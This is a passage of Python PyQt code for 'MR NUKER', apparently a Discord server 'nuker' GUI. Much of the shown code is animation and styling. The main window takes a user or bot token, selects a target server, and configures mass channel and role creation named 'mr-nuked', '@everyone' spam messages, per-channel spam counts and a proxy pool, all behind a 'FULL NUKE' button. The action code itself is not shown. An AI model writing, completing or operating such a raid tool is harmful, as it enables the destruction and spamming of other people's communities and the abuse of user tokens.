                "r": random.uniform(0.6, 2.4), "a": random.uniform(0.15, 0.65),
                "hue": random.choice([P["blue_soft"], P["cyan"], P["white"]]),
            })
        for m in self.motes:
            m["x"] += m["vx"]; m["y"] += m["vy"]
            if m["y"] < -10:
                m["y"] = h + 10; m["x"] = random.uniform(0, w)
        self.update()

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        w, h = self.width(), self.height()
        cx, cy = w * 0.5, h * 0.46

        grad = QLinearGradient(0, 0, 0, h)
        grad.setColorAt(0.0, QColor(P["panel"]))
        grad.setColorAt(0.55, QColor(P["deep"]))
        grad.setColorAt(1.0, QColor(P["void"]))
        p.fillRect(self.rect(), QBrush(grad))

        b1 = QRadialGradient(QPointF(cx - w * 0.22 + math.sin(self.t) * 26, cy - 40), w * 0.5)
        b1.setColorAt(0.0, QColor(47, 125, 255, 62))
        b1.setColorAt(1.0, QColor(47, 125, 255, 0))
        p.setBrush(QBrush(b1)); p.setPen(Qt.PenStyle.NoPen)
        p.drawRect(self.rect())

        b2 = QRadialGradient(QPointF(cx + w * 0.26, cy + math.cos(self.t * 0.8) * 36), w * 0.46)
        b2.setColorAt(0.0, QColor(79, 216, 255, 54))
        b2.setColorAt(1.0, QColor(79, 216, 255, 0))
        p.setBrush(QBrush(b2)); p.drawRect(self.rect())

        p.save()
        p.translate(cx, cy)
        p.rotate(self.t * 14)
        for i, rr in enumerate((h * 0.32, h * 0.46, h * 0.60)):
            col = QColor(P["cyan"] if i == 1 else P["blue"])
            col.setAlpha(26 + i * 5)
            p.setPen(QPen(col, 1.1)); p.setBrush(Qt.BrushStyle.NoBrush)
            p.drawEllipse(QPointF(0, 0), rr, rr)
            p.setPen(QPen(col, 1.0, Qt.PenStyle.DotLine))
            p.drawEllipse(QPointF(0, 0), rr * 0.86, rr * 0.86)
        p.rotate(-self.t * 28)
        for _ in range(16):
            p.rotate(360 / 16)
            col = QColor(P["white"]); col.setAlpha(12)
            p.setPen(QPen(col, 1.0))
            p.drawLine(QPointF(0, h * 0.32), QPointF(0, h * 0.60))
        p.restore()

        p.setPen(Qt.PenStyle.NoPen)
        for m in self.motes:
            col = QColor(m["hue"]); col.setAlphaF(m["a"])
            p.setBrush(QBrush(col))
            p.drawEllipse(QPointF(m["x"], m["y"]), m["r"], m["r"])
        p.end()

# ─────────────────────────────────────────────────────────────
#  PARTICLES
# ─────────────────────────────────────────────────────────────
class ParticleLayer(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setAttribute(Qt.WidgetAttribute.WA_TransparentForMouseEvents)
        self.parts = []
        self.timer = QTimer(self)
        self.timer.timeout.connect(self._tick)

    def burst(self, x, y, palette=None):
        palette = palette or [P["blue"], P["cyan"], P["blue_soft"], P["white"], "#bcd8ff"]
        for _ in range(80):
            a = random.uniform(0, math.tau)
            s = random.uniform(2, 10)
            self.parts.append({
                "x": x, "y": y,
                "vx": math.cos(a) * s, "vy": math.sin(a) * s - 1,
                "life": 1.0, "decay": random.uniform(0.015, 0.035),
                "r": random.uniform(1.5, 4.2), "c": random.choice(palette),
            })
        if not self.timer.isActive():
            self.timer.start(16)
        self.update()

    def _tick(self):
        alive = []
        for pt in self.parts:
            pt["x"] += pt["vx"]; pt["y"] += pt["vy"]
            pt["vx"] *= 0.95; pt["vy"] *= 0.95; pt["vy"] += 0.22
            pt["life"] -= pt["decay"]
            if pt["life"] > 0:
                alive.append(pt)
        self.parts = alive
        if self.parts:
            self.update()
        else:
            self.timer.stop()

    def paintEvent(self, event):
        if not self.parts:
            return
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        for pt in self.parts:
            c = QColor(pt["c"]); c.setAlphaF(max(0.0, min(1.0, pt["life"])))
            p.setPen(Qt.PenStyle.NoPen)
            p.setBrush(QBrush(QColor(c.red(), c.green(), c.blue(), int(55 * pt["life"]))))
            p.drawEllipse(QPointF(pt["x"], pt["y"]), pt["r"] * 2.3, pt["r"] * 2.3)
            p.setBrush(QBrush(c))
            p.drawEllipse(QPointF(pt["x"], pt["y"]), pt["r"], pt["r"])
        p.end()

# ─────────────────────────────────────────────────────────────
#  NEON TITLE
# ─────────────────────────────────────────────────────────────
class NeonTitle(QWidget):
    def __init__(self, text, size=36, parent=None):
        super().__init__(parent)
        self.text = text
        self.fsize = size
        self.phase = 0.0
        self.setMinimumHeight(int(size * 1.5))
        self.timer = QTimer(self)
        self.timer.timeout.connect(self._tick)
        self.timer.start(55)

    def _tick(self):
        self.phase += 0.075
        self.update()

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        font = QFont("Impact", self.fsize)
        font.setBold(True)
        font.setLetterSpacing(QFont.SpacingType.AbsoluteSpacing, self.fsize * 0.32)
        p.setFont(font)
        fm = QFontMetrics(font)
        tw = fm.horizontalAdvance(self.text)
        x = (self.width() - tw) / 2
        y = (self.height() + fm.capHeight()) / 2
        pt = QPointF(x, y)

        pulse = 0.5 + 0.5 * math.sin(self.phase)
        for i in range(6, 0, -1):
            halo = QColor(P["blue"] if pulse > 0.5 else P["cyan"])
            halo.setAlpha(int((12 + 9 * pulse) * i / 6) + 3)
            p.setPen(QPen(halo, i * 2.3, Qt.PenStyle.SolidLine,
                          Qt.PenCapStyle.RoundCap, Qt.PenJoinStyle.RoundJoin))
            p.drawText(pt, self.text)

        g = QLinearGradient(x, 0, x + tw, 0)
        shift = (math.sin(self.phase * 0.5) + 1) / 2
        g.setColorAt(0.0, QColor(P["blue_soft"]))
        g.setColorAt(max(0.0, min(1.0, 0.45 + (shift - 0.5) * 0.4)), QColor("#ffffff"))
        g.setColorAt(0.75, QColor(P["cyan"]))
        g.setColorAt(1.0, QColor(P["white"]))
        p.setPen(QPen(QBrush(g), 1.0))
        p.drawText(pt, self.text)
        p.end()

# ─────────────────────────────────────────────────────────────
#  STATUS ORB
# ─────────────────────────────────────────────────────────────
class StatusOrb(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedSize(18, 18)
        self.state = "idle"
        self.phase = 0.0
        self.timer = QTimer(self)
        self.timer.timeout.connect(self._tick)
        self.timer.start(70)

    def set_state(self, s):
        self.state = s
        self.update()

    def _tick(self):
        self.phase += 0.14
        self.update()

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        base = {"running": QColor(P["green"]), "stopped": QColor(P["red"])}.get(
            self.state, QColor(P["muted"]))
        pulse = 0.5 + 0.5 * math.sin(self.phase)
        halo = QRadialGradient(QPointF(9, 9), 9)
        c = QColor(base); c.setAlpha(int(40 + 130 * pulse))
        halo.setColorAt(0.0, c)
        halo.setColorAt(1.0, QColor(base.red(), base.green(), base.blue(), 0))
        p.setBrush(QBrush(halo)); p.setPen(Qt.PenStyle.NoPen)
        p.drawEllipse(QRectF(0, 0, 18, 18))
        p.setBrush(QBrush(base)); p.drawEllipse(QRectF(5.5, 5.5, 7, 7))
        p.end()

# ─────────────────────────────────────────────────────────────
#  STAT BOX
# ─────────────────────────────────────────────────────────────
class StatBox(QFrame):
    def __init__(self, label, color, parent=None):
        super().__init__(parent)
        self._color = color
        self.target = 0.0
        self.current = 0.0
        self.setFixedHeight(66)
        lay = QVBoxLayout(self)
        lay.setContentsMargins(12, 8, 12, 8)
        lay.setSpacing(1)
        self.num = QLabel("0")
        self.num.setStyleSheet(
            f"color:{color}; font-size:22px; font-weight:900; font-family:'Consolas',monospace;")
        self.num.setAlignment(Qt.AlignmentFlag.AlignCenter)
        lbl = QLabel(label)
        lbl.setStyleSheet(
            f"color:{P['muted']}; font-size:9px; letter-spacing:3px; font-weight:700;")
        lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        lay.addWidget(self.num)
        lay.addWidget(lbl)
        self.anim = QTimer(self)
        self.anim.timeout.connect(self._tick)

    def set_value(self, v):
        self.target = float(v)
        if not self.anim.isActive():
            self.anim.start(30)

    def _tick(self):
        if abs(self.current - self.target) < 0.5:
            self.current = self.target
            self.anim.stop()
        else:
            self.current += (self.target - self.current) * 0.24
        self.num.setText(str(int(round(self.current))))

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        r = QRectF(self.rect()).adjusted(1, 1, -1, -1)
        path = QPainterPath(); path.addRoundedRect(r, 13, 13)
        c0 = QColor(self._color)
        g0 = QLinearGradient(r.topLeft(), r.bottomLeft())
        g0.setColorAt(0.0, QColor(c0.red(), c0.green(), c0.blue(), 64))
        g0.setColorAt(1.0, QColor(c0.red(), c0.green(), c0.blue(), 8))
        p.fillPath(path, QBrush(g0))
        p.setPen(QPen(QColor(c0.red(), c0.green(), c0.blue(), 140), 1.2))
        p.drawPath(path)
        p.end()

# ─────────────────────────────────────────────────────────────
#  SPARKLINE
# ─────────────────────────────────────────────────────────────
class Sparkline(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedHeight(48)
        self.data = deque([0.0] * 90, maxlen=90)

    def push(self, v):
        self.data.append(float(v))
        self.update()

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        w, h = self.width(), self.height()
        r = QRectF(self.rect()).adjusted(1, 1, -1, -1)
        path = QPainterPath(); path.addRoundedRect(r, 12, 12)
        bg = QLinearGradient(0, 0, 0, h)
        bg.setColorAt(0.0, QColor(47, 125, 255, 26))
        bg.setColorAt(1.0, QColor(47, 125, 255, 4))
        p.fillPath(path, QBrush(bg))
        p.setPen(QPen(QColor(47, 125, 255, 60), 1.0))
        p.setBrush(Qt.BrushStyle.NoBrush)
        p.drawPath(path)

        n = len(self.data)
        mx = max(max(self.data), 1.0)
        pad = 8
        pts = [QPointF(pad + (w - 2 * pad) * (i / (n - 1)),
                       h - pad - (h - 2 * pad) * (v / mx))
               for i, v in enumerate(self.data)]
        line = QPainterPath(pts[0])
        for pt in pts[1:]:
            line.lineTo(pt)
        area = QPainterPath(line)
        area.lineTo(pad + (w - 2 * pad), h - pad)
        area.lineTo(pad, h - pad)
        area.closeSubpath()
        ag = QLinearGradient(0, 0, 0, h)
        ag.setColorAt(0.0, QColor(79, 216, 255, 120))
        ag.setColorAt(1.0, QColor(79, 216, 255, 0))
        p.fillPath(area, QBrush(ag))

        lg = QLinearGradient(pad, 0, w - pad, 0)
        lg.setColorAt(0.0, QColor(P["blue"]))
        lg.setColorAt(1.0, QColor(P["cyan"]))
        p.setPen(QPen(QBrush(lg), 2.0, Qt.PenStyle.SolidLine,
                      Qt.PenCapStyle.RoundCap, Qt.PenJoinStyle.RoundJoin))
        p.drawPath(line)

        p.setPen(Qt.PenStyle.NoPen)
        last = pts[-1]
        halo = QRadialGradient(last, 8)
        halo.setColorAt(0.0, QColor(255, 255, 255, 220))
        halo.setColorAt(1.0, QColor(255, 255, 255, 0))
        p.setBrush(QBrush(halo)); p.drawEllipse(last, 8, 8)
        p.setBrush(QBrush(QColor(P["white"]))); p.drawEllipse(last, 2.6, 2.6)
        p.end()

# ─────────────────────────────────────────────────────────────
#  DIVIDER
# ─────────────────────────────────────────────────────────────
class RuneDivider(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedHeight(14)
        self.t = 0.0
        self.timer = QTimer(self)
        self.timer.timeout.connect(self._tick)
        self.timer.start(50)

    def _tick(self):
        self.t = (self.t + 0.012) % 1.0
        self.update()

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        w, h = self.width(), self.height()
        cy = h / 2
        line = QLinearGradient(0, 0, w, 0)
        line.setColorAt(0.0, QColor(47, 125, 255, 0))
        line.setColorAt(0.5, QColor(79, 216, 255, 170))
        line.setColorAt(1.0, QColor(47, 125, 255, 0))
        p.setPen(QPen(QBrush(line), 1.2))
        p.drawLine(QPointF(0, cy), QPointF(w, cy))
        x = self.t * w
        dot = QRadialGradient(QPointF(x, cy), 9)
        dot.setColorAt(0.0, QColor(255, 255, 255, 220))
        dot.setColorAt(1.0, QColor(255, 255, 255, 0))
        p.setPen(Qt.PenStyle.NoPen); p.setBrush(QBrush(dot))
        p.drawEllipse(QPointF(x, cy), 9, 9)
        p.end()

# ─────────────────────────────────────────────────────────────
#  TOAST
# ─────────────────────────────────────────────────────────────
class Toast(QLabel):
    def __init__(self, parent, text, color):
        super().__init__(text, parent)
        self.setStyleSheet(
            f"background: rgba(6,16,36,238); color:{color}; "
            f"border:1px solid {color}; border-radius:12px; "
            f"padding:10px 18px; font-weight:700; letter-spacing:2px; font-size:11px;"
        )
        self.adjustSize()
        self.setFixedWidth(max(220, self.width() + 20))
        self.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.effect = QGraphicsOpacityEffect(self)
        self.setGraphicsEffect(self.effect)
        self.effect.setOpacity(0.0)

    def pop(self, x, y):
        self.move(x, y)
        self.show()
        self.raise_()
        self.anim = QPropertyAnimation(self.effect, b"opacity")
        self.anim.setDuration(200)
        self.anim.setStartValue(0.0)
        self.anim.setEndValue(1.0)
        self.anim.setEasingCurve(QEasingCurve.Type.OutCubic)
        self.anim.start()
        QTimer.singleShot(1600, self._fade)

    def _fade(self):
        self.anim2 = QPropertyAnimation(self.effect, b"opacity")
        self.anim2.setDuration(380)
        self.anim2.setStartValue(1.0)
        self.anim2.setEndValue(0.0)
        self.anim2.finished.connect(self.deleteLater)
        self.anim2.start()

# ─────────────────────────────────────────────────────────────
#  BOOT OVERLAY
# ─────────────────────────────────────────────────────────────
class BootOverlay(QWidget):
    done = pyqtSignal()

    LINES = [
        "> initializing nuke core ...",
        "> loading rate-limit tracker ...",
        "> binding discord api gateway ...",
        "> arming action matrix ...",
        "MR NUKER",
    ]

    def __init__(self, parent=None):
        super().__init__(parent)
        self.li = 0
        self.ci = 0
        self.shown = []
        self._finishing = False
        self.timer = QTimer(self)
        self.timer.timeout.connect(self._step)
        self.timer.start(18)

    def _step(self):
        if self.li >= len(self.LINES):
            return
        line = self.LINES[self.li]
        self.ci += 1
        if self.ci > len(line):
            self.shown.append((line, self.li == len(self.LINES) - 1))
            self.li += 1
            self.ci = 0
        self.update()

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        p.fillRect(self.rect(), QColor(3, 9, 18, 246))
        font = QFont("Cascadia Code", 12)
        p.setFont(font)
        y = 46
        for text, hero in self.shown:
            if hero:
                p.setFont(QFont("Impact", 26))
                p.setPen(QPen(QColor(P["cyan"])))
                p.drawText(44, y + 12, text)
                p.setFont(font)
                y += 34
            else:
                p.setPen(QPen(QColor(P["blue_soft"])))
                p.drawText(44, y, text)
            y += 24
        if self.li < len(self.LINES):
            cur = self.LINES[self.li][:self.ci]
            if self.li == len(self.LINES) - 1:
                p.setFont(QFont("Impact", 26))
                p.setPen(QPen(QColor(P["cyan"])))
            else:
                p.setPen(QPen(QColor(P["muted"])))
            p.drawText(44, y, cur + "_")
            p.setFont(font)
        else:
            if not self._finishing:
                self._finishing = True
                self.timer.stop()
                QTimer.singleShot(280, self._finish)

    def _finish(self):
        self.done.emit()

# ─────────────────────────────────────────────────────────────
#  FIELD
# ─────────────────────────────────────────────────────────────
class Field(QWidget):
    def __init__(self, label, placeholder="", password=False, parent=None):
        super().__init__(parent)
        lay = QVBoxLayout(self)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.setSpacing(4)
        cap = QLabel(label)
        cap.setObjectName("cap")
        self.edit = QLineEdit()
        self.edit.setPlaceholderText(placeholder)
        if password:
            self.edit.setEchoMode(QLineEdit.EchoMode.Password)
        lay.addWidget(cap)
        lay.addWidget(self.edit)

    def text(self):
        return self.edit.text().strip()

# ─────────────────────────────────────────────────────────────
#  MAIN WINDOW
# ─────────────────────────────────────────────────────────────
class NukerWindow(QWidget):
    EDGE = 9

    def __init__(self):
        super().__init__()
        self.stats = {"ok": 0, "err": 0, "ops": 0}
        self._last_ops = 0
        self._action_thread = None
        self._busy = False

        self._drag = None
        self._resize_edge = None
        self._start_geo = None
        self._start_pos = None

        self.sig = Signals()
        self.sig.log.connect(self.append_log)
        self.sig.state.connect(self.set_state)
        self.sig.stats.connect(self.update_stats)
        self.sig.done.connect(self._on_action_done)
        self.sig.auth_ok.connect(self._auth_ok)
        self.sig.auth_fail.connect(self._auth_fail)
        self.sig.guilds_loaded.connect(self._servers_loaded)

        self.setWindowTitle("Mr Nuker")
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint)
        self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        self.setMouseTracking(True)
        self.setMinimumSize(1000, 640)
        self.resize(1180, 740)
        self.setStyleSheet(STYLE)

        self._build_ui()

    # ───────────────────────────────────────────────
    def _build_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(16, 16, 16, 16)

        self.frame = GlassFrame(radius=22)
        root.addWidget(self.frame)

        self.backdrop = AuroraBackdrop(self.frame)
        self.backdrop.lower()

        lay = QVBoxLayout(self.frame)
        lay.setContentsMargins(24, 14, 24, 18)
        lay.setSpacing(10)

        lay.addLayout(self._titlebar())
        lay.addWidget(RuneDivider())

        main = QHBoxLayout()
        main.setSpacing(18)

        # ── LEFT ────────────────────────────────────
        left = QWidget()
        left.setFixedWidth(430)
        left_lay = QVBoxLayout(left)
        left_lay.setContentsMargins(0, 0, 0, 0)
        left_lay.setSpacing(10)

        hero = NeonTitle("MR NUKER", size=34)
        left_lay.addWidget(hero)

        sub = QLabel("DISCORD CONTROL TERMINAL   ·   " + CREDIT)
        sub.setStyleSheet(
            f"color:{P['blue_soft']}; letter-spacing:5px; font-size:9px; font-weight:700;")
        sub.setAlignment(Qt.AlignmentFlag.AlignCenter)
        left_lay.addWidget(sub)

        self.tabs = QTabWidget()
        self.tabs.addTab(self._auth_tab(), "LINK")
        self.tabs.addTab(self._config_tab(), "CONFIG")
        left_lay.addWidget(self.tabs, 1)

        self.btn_nuke = QPushButton("⚡   F U L L   N U K E")
        self.btn_nuke.setObjectName("detonate")
        self.btn_nuke.setMinimumHeight(52)
        self.btn_nuke.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
        self.btn_nuke.clicked.connect(self._confirm_nuke)
        left_lay.addWidget(self.btn_nuke)

        # ── RIGHT ───────────────────────────────────
        right = QVBoxLayout()
        right.setSpacing(12)

        stats_row = QHBoxLayout()
        stats_row.setSpacing(10)
        self.stat_ok  = StatBox("OPERATIONS", P["green"])
        self.stat_err = StatBox("FAULTS",     P["red"])
        self.stat_ops = StatBox("TOTAL",      P["cyan"])
        for s in (self.stat_ok, self.stat_err, self.stat_ops):
            stats_row.addWidget(s)
        right.addLayout(stats_row)

        self.spark = Sparkline()
        right.addWidget(self.spark)

        grid = QGridLayout()
        grid.setSpacing(8)
        self._action_buttons = []
        for i, (label, fn, danger) in enumerate(ACTIONS):
            btn = QPushButton(label)
            btn.setObjectName("actDanger" if danger else "act")
            btn.setMinimumHeight(44)
            btn.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
            btn.clicked.connect(lambda _, n=label, f=fn: self._run_action(n, f))
            grid.addWidget(btn, i // 4, i % 4)
            self._action_buttons.append(btn)
        right.addLayout(grid)

        self.log = QTextEdit()
        self.log.setReadOnly(True)
        right.addWidget(self.log, 1)

        main.addWidget(left)
        main.addLayout(right, 1)
        lay.addLayout(main, 1)

        # ── FOOTER ──────────────────────────────────
        footer = QHBoxLayout()
        footer.setSpacing(10)
        self.orb = StatusOrb()
        footer.addWidget(self.orb)

        self.state_lbl = QLabel("STATUS // IDLE")
        self.state_lbl.setStyleSheet(
            f"color:{P['muted']}; letter-spacing:4px; font-size:10px; font-weight:700;")
        footer.addWidget(self.state_lbl)
        footer.addStretch()

        mb_foot = QLabel(MADE_BY)
        mb_foot.setStyleSheet(
            f"color:{P['cyan']}; letter-spacing:1px; font-size:10px; font-weight:700;")
        footer.addWidget(mb_foot)
        footer.addSpacing(10)

        clear_btn = QPushButton("CLEAR LOG")
        clear_btn.setObjectName("ghost")
        clear_btn.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
        clear_btn.clicked.connect(lambda: self.log.clear())
        footer.addWidget(clear_btn)

        self.stop_btn = QPushButton("ABORT")
        self.stop_btn.setObjectName("ghost")
        self.stop_btn.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
        self.stop_btn.setEnabled(False)
        self.stop_btn.setStyleSheet(
            f"QPushButton{{color:{P['red']};border:1px solid rgba(255,93,122,120);"
            f"background:rgba(255,93,122,18);border-radius:9px;padding:7px 18px;"
            f"font-weight:800;letter-spacing:2px;}}"
            f"QPushButton:hover{{background:rgba(255,93,122,120);color:#ffffff;}}"
            f"QPushButton:disabled{{color:rgba(150,160,180,90);"
            f"border:1px solid rgba(120,130,150,45);background:rgba(255,255,255,4);}}"
        )
        self.stop_btn.clicked.connect(self._abort)
        footer.addWidget(self.stop_btn)
        lay.addLayout(footer)

        self.particles = ParticleLayer(self.frame)
        self.particles.raise_()

        self.boot = BootOverlay(self.frame)
        self.boot.done.connect(self._end_boot)
        self.boot.raise_()

    # ───────────────────────────────────────────────
    def _titlebar(self):
        bar = QHBoxLayout()
        t = QLabel("◆   M R   N U K E R")
        t.setStyleSheet(
            f"color:{P['white']}; font-family:'Impact','Arial Black',sans-serif; "
            f"font-size:15px; letter-spacing:4px;")
        bar.addWidget(t)
        v = QLabel(CREDIT)
        v.setStyleSheet(f"color:{P['blue_soft']}; font-size:10px; letter-spacing:1px;")
        bar.addWidget(v)
        bar.addSpacing(12)
        mb = QLabel(MADE_BY)
        mb.setStyleSheet(
            f"color:{P['cyan']}; font-size:10px; font-weight:800; letter-spacing:1px;")
        bar.addWidget(mb)
        bar.addStretch()

        self.pin_btn = QPushButton("⤢")
        self.pin_btn.setObjectName("wbtn")
        self.pin_btn.setCheckable(True)
        self.pin_btn.setFixedSize(32, 28)
        self.pin_btn.setToolTip("Always on top")
        self.pin_btn.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
        self.pin_btn.toggled.connect(self._toggle_top)
        bar.addWidget(self.pin_btn)

        mini = QPushButton("—")
        mini.setObjectName("wbtn")
        mini.setFixedSize(32, 28)
        mini.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
        mini.clicked.connect(self.showMinimized)
        bar.addWidget(mini)

        close = QPushButton("✕")
        close.setObjectName("wbtn")
        close.setProperty("class", "closebtn")
        close.setFixedSize(32, 28)
        close.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
        close.clicked.connect(self.close)
        bar.addWidget(close)
        return bar

    def _toggle_top(self, on):
        self.setWindowFlag(Qt.WindowType.WindowStaysOnTopHint, on)
        self.show()

    # ───────────────────────────────────────────────
    def _auth_tab(self):
        w = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(16, 16, 16, 14)
        lay.setSpacing(9)

        self.token_field = Field("USER / BOT TOKEN", "paste token", password=True)
        lay.addWidget(self.token_field)

        row = QHBoxLayout()
        row.setSpacing(8)
        self.btn_connect = QPushButton("CONNECT")
        self.btn_connect.setObjectName("primary")
        self.btn_connect.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
        self.btn_connect.clicked.connect(self._on_connect)
        row.addWidget(self.btn_connect)
        self.auth_lbl = QLabel("not linked")
        self.auth_lbl.setStyleSheet(
            f"color:{P['muted']}; font-size:10px; letter-spacing:1px;")
        row.addWidget(self.auth_lbl, 1)
        lay.addLayout(row)

        cap = QLabel("TARGET SERVER")
        cap.setObjectName("cap")
        lay.addWidget(cap)

        row2 = QHBoxLayout()
        row2.setSpacing(8)
        self.cmb_server = QComboBox()
        self.cmb_server.addItem("— connect first —", None)
        self.cmb_server.setEnabled(False)
        self.cmb_server.currentIndexChanged.connect(self._on_server_changed)
        row2.addWidget(self.cmb_server, 1)
        self.btn_refresh = QPushButton("↻")
        self.btn_refresh.setObjectName("ghost")
        self.btn_refresh.setFixedWidth(40)
        self.btn_refresh.setEnabled(False)
        self.btn_refresh.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
        self.btn_refresh.clicked.connect(self._refresh_servers)
        row2.addWidget(self.btn_refresh)
        lay.addLayout(row2)

        row3 = QHBoxLayout()
        row3.setSpacing(8)
        self.in_manual = QLineEdit()
        self.in_manual.setPlaceholderText("or enter guild ID...")
        self.in_manual.returnPressed.connect(self._use_manual_id)
        row3.addWidget(self.in_manual, 1)
        b = QPushButton("USE")
        b.setObjectName("ghost")
        b.setFixedWidth(52)
        b.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
        b.clicked.connect(self._use_manual_id)
        row3.addWidget(b)
        lay.addLayout(row3)

        lay.addStretch()
        return w

    def _config_tab(self):
        w = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(16, 16, 16, 14)
        lay.setSpacing(9)

        self.in_channel = Field("CHANNEL NAME", "mr-nuked")
        self.in_channel.edit.setText("mr-nuked")
        lay.addWidget(self.in_channel)

        self.in_role = Field("ROLE NAME", "mr-nuked")
        self.in_role.edit.setText("mr-nuked")
        lay.addWidget(self.in_role)

        cap = QLabel("SPAM MESSAGE")
        cap.setObjectName("cap")
        lay.addWidget(cap)
        self.in_msg = QLineEdit()
        self.in_msg.setText("@everyone mr nuker was here")
        lay.addWidget(self.in_msg)

        counts = QHBoxLayout()
        counts.setSpacing(8)

        def spin(label, default, lo=1, hi=500):
            box = QWidget()
            v = QVBoxLayout(box)
            v.setContentsMargins(0, 0, 0, 0)
            v.setSpacing(4)
            c = QLabel(label)
            c.setObjectName("cap")
            s = QSpinBox()
            s.setRange(lo, hi)
            s.setValue(default)
            v.addWidget(c)
            v.addWidget(s)
            return box, s

        b1, self.spin_count   = spin("CREATE COUNT", 10)
        b2, self.spin_spam    = spin("MSGS / CHANNEL", 10)
        b3, self.spin_threads = spin("THREADS / CH", 3, 1, 50)
        counts.addWidget(b1); counts.addWidget(b2); counts.addWidget(b3)
        lay.addLayout(counts)

        self.chk_proxy = QCheckBox("ENABLE PROXY POOL")
        self.chk_proxy.toggled.connect(self._on_proxy_toggle)
        lay.addWidget(self.chk_proxy)

        lay.addStretch()
        return w

    # ───────────────────────────────────────────────
    def _end_boot(self):
        try:
            self.boot.hide()
            self.boot.deleteLater()
        except Exception:
            pass
        self._toast("NUKER CORE ONLINE", P["cyan"])
        self.append_log("Session started.", LEVEL_SYS)

    def _toast(self, text, color):
        t = Toast(self, text, color)
        g = self.frame.geometry()
        t.pop(g.right() - t.width() - 24, g.bottom() - t.height() - 68)

    def append_log(self, text, level="sys"):
        colors = {
            LEVEL_OK:  (P["green"],    "✦"),
            LEVEL_ERR: (P["red"],      "✕"),
            LEVEL_WARN:(P["amber"],    "!"),
            LEVEL_SYS: (P["blue_soft"],"▸"),
        }
        color, glyph = colors.get(level, (P["text"], "•"))
        ts = time.strftime("%H:%M:%S")
        safe = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        self.log.append(
            f'<span style="color:{P["muted"]}">[{ts}]</span> '
            f'<span style="color:{color}">{glyph} {safe}</span>'
        )
        sb = self.log.verticalScrollBar()
        sb.setValue(sb.maximum())

    def set_state(self, text):
        self.state_lbl.setText("STATUS // " + text.upper())
        colors = {"RUNNING": P["green"], "STOPPED": P["red"], "READY": P["cyan"]}
        self.state_lbl.setStyleSheet(
            f"color:{colors.get(text.upper(), P['muted'])}; "
            f"letter-spacing:4px; font-size:10px; font-weight:700;")
        self.orb.set_state(text.lower() if text.lower() in ("running", "stopped") else "idle")

    def update_stats(self, ok, err, ops):
        self.stat_ok.set_value(ok)
        self.stat_err.set_value(err)
        self.stat_ops.set_value(ops)
        delta = max(0, ops - self._last_ops)
        self._last_ops = ops
        self.spark.push(delta)

    # ───────────────────────────────────────────────
    def _log_bridge(self, tag, msg):
        lvl = tag_level(tag)
        if lvl == LEVEL_ERR:
            self.stats["err"] += 1
        elif lvl == LEVEL_OK:
            self.stats["ok"] += 1
        self.stats["ops"] += 1
        self.sig.log.emit(f"{tag} · {msg}", lvl)
        self.sig.stats.emit(self.stats["ok"], self.stats["err"], self.stats["ops"])

    # ───────────────────────────────────────────────
    def _on_connect(self):
        tok = self.token_field.text()
        if not tok:
            self._toast("TOKEN REQUIRED", P["red"])
            return
        self.btn_connect.setEnabled(False)
        self.btn_connect.setText("...")
        self.auth_lbl.setText("validating...")
        self.auth_lbl.setStyleSheet(
            f"color:{P['blue_soft']}; font-size:10px; letter-spacing:1px;")
        threading.Thread(target=self._connect_bg, args=(tok,), daemon=True).start()

    def _connect_bg(self, tok):
        attempts = [("bot", tok)] if tok.startswith("Bot ") else \
                   [("user", tok), ("bot", f"Bot {tok}")]
        for kind, auth in attempts:
            try:
                r = requests.get(f"{BASE}/users/@me",
                                 headers={"Authorization": auth, "User-Agent": UA},
                                 timeout=10)
                if r.status_code == 200:
                    _state["TOKEN"] = auth
                    u = r.json()
                    name = f"{u.get('username','?')}#{u.get('discriminator','0')}"
                    self.sig.log.emit(f"Linked as {name}  [{kind}]", LEVEL_OK)
                    self.sig.auth_ok.emit(name)
                    return
            except Exception:
                pass
        self.sig.auth_fail.emit()

    def _auth_ok(self, name):
        self.auth_lbl.setText(f"✓ {name}")
        self.auth_lbl.setStyleSheet(
            f"color:{P['green']}; font-size:10px; font-weight:700;")
        self.btn_connect.setText("RECONNECT")
        self.btn_connect.setEnabled(True)
        self.btn_refresh.setEnabled(True)
        self._toast("LINK ESTABLISHED", P["green"])
        self.stats = {"ok": 0, "err": 0, "ops": 0}
        self._last_ops = 0
        self.update_stats(0, 0, 0)
        self._refresh_servers()

    def _auth_fail(self):
        self.auth_lbl.setText("✗ invalid token")
        self.auth_lbl.setStyleSheet(
